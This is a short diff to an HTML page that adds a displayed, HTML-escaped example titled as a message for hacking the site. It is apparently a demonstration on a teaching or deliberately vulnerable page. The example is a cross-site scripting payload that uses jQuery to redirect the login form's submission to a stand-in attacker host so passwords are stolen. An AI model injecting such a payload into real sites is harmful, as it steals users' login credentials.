@@ -51,5 +51,17 @@
 
 </div>
 
+<div style="margin-top: 5em;">
+
+An example of a message for hacking this site:
+<pre>
+&lt;script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js" type="text/javascript">&lt;/script>
+&lt;script type="text/javascript">
+$("form#loginForm").attr("action", "http://hackers-site-which-steals-your-password");
+&lt;/script>
+</pre>
+
+</div>
+
 </body>
 </html>
